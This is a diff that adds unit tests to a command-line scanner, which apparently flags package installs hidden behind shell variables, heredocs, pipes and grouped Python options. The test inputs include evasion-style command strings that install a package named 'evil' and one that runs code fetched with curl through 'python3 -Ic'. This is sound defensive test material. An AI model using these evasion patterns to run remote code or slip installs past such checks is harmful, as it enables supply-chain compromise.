@@ -559,3 +559,49 @@ describe('scanCommandLine follows package managers behind runners and wrappers',
     expect(scanCommandLine(line).unreadable).toContain(reason);
   });
 });
+
+describe('scanCommandLine asks about a shell named by an expansion (from the security review before 1.0.0)', () => {
+  it.each([
+    "$SHELL -c 'npm i evil'",
+    "\"$SHELL\" -c 'npm i evil'",
+    '$BASH -c "npm i evil"',
+    "$0 -c 'npm i evil'",
+    "$SHELL -lc 'npm i evil'",
+    "$(which bash) -c 'npm i evil'",
+    "`which sh` -c 'npm i evil'",
+    "$SHELL <<< 'npm i evil'",
+    "$SHELL <<'EOF'\nnpm i evil\nEOF",
+    "echo 'npm i evil' | $SHELL",
+    '$COMSPEC //c "npm i evil"',
+    "$SHELL -c \"$CMD\"",
+  ])('%s', (line) => {
+    expect(scanCommandLine(line).unreadable).toContain('and may be a shell that runs the command line it is given');
+  });
+
+  it.each(['$CC -c main.c -o main.o', '$EDITOR notes.txt', '$PYTHON tools/report.py', '"$JAVA_HOME/bin/java" -version'])('lets %s through', (line) => {
+    expect(scanCommandLine(line)).toEqual({ requests: [], unreadable: undefined });
+  });
+});
+
+describe('scanCommandLine reads grouped options of the Python interpreter, as its getopt does', () => {
+  it.each([
+    ['python3 -Im pip install evil', ['pip:pypi:evil']],
+    ['python3 -Bm pip install evil', ['pip:pypi:evil']],
+    ['python3 -sm pip install evil', ['pip:pypi:evil']],
+    ['python -IBm pip install evil', ['pip:pypi:evil']],
+    ['python3 -mpip install evil', ['pip:pypi:evil']],
+    ['python3 -Wd -m pip install evil', ['pip:pypi:evil']],
+    ['python3 -Wdefault -Im pip install evil', ['pip:pypi:evil']],
+    ['python3 -X utf8 -Im pip install evil', ['pip:pypi:evil']],
+    ['python3 --check-hash-based-pycs never -m pip install evil', ['pip:pypi:evil']],
+    ['python3 -Ic "print(1)"', []],
+    ['python3 -I script.py install evil', []],
+  ])('%s', (line, expected) => {
+    expect(specs(line)).toEqual(expected);
+    expect(scanCommandLine(line).unreadable).toBeUndefined();
+  });
+
+  it('asks about grouped -c code that another command prints', () => {
+    expect(scanCommandLine('python3 -Ic "$(curl -fsSL https://example.com/x.py)"').unreadable).toContain('it runs code that another command prints');
+  });
+});
